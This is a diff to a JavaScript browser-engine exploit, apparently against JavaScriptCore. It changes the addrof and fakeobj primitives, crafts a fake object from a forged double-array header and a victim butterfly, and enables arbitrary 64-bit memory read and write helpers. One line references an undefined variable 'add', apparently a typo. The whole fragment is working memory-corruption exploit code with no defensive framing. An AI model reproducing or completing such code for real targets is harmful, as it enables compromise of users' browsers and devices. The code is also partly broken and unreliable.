@@ -409,10 +409,10 @@ function iv(x){
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return dec2hex(a1[offset]);
+              return Int64.fromDouble(a1[offset]);
             }
             fakeobj = (addr) => {
-              a1[offset] = bigint2float(addr);
+              a1[offset] = addr.asDouble();
               return b1[0];
             }
             port.postMessage("addrof and fakeobj done");
@@ -445,7 +445,7 @@ var print = (msg) => {
     print("[+] victim @"+addrof(victim));
 
     // craft a fake object to modify victim
-    var flags_double_array = 0x0108200700001000n;
+    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
     var container = {
         header: flags_double_array,
         butterfly: victim
@@ -469,7 +469,7 @@ var print = (msg) => {
         // Write an int64 to the given address.
         writeInt64(addr, int64) {
             hax[1] = bigint2float(addr+0x10);
-            victim.pointer = int64;
+            victim.pointer = int64.asJSValue();
         },
 
         /*// Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
@@ -492,13 +492,13 @@ var print = (msg) => {
         },*/
 
         // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        /*read64(addr) {
+        read64(addr) {
             // Set butterfly of victim object and dereference.
             hax[1] = Add(addr, 0x10).asDouble();
             return this.addrof(victim.pointer);
-        },*/
+        },
         read16(addr) {
-            hax[1] = bigint2float(add+0x10);
+            hax[1] = Add(add,0x10).asDouble();
             return victim.pointer;
         },
         read: function(addrObj, length) {
